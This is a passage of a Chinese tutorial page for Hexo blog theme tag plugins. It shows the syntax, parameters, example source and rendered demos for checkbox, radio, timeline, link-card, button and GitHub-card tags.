faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-复选列表-checkbox">2.7 复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-单选列表-radio">2.8 单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-时间轴-timeline">2.9 时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-链接卡片-link">2.10 链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-按钮-btns">2.11 按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题<code>&lt;/b&gt;</code>和<code>&lt;p&gt;</code>描述文字<code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p red'>专业版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p green'>免费版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-github卡片-ghcard">2.12 github卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img 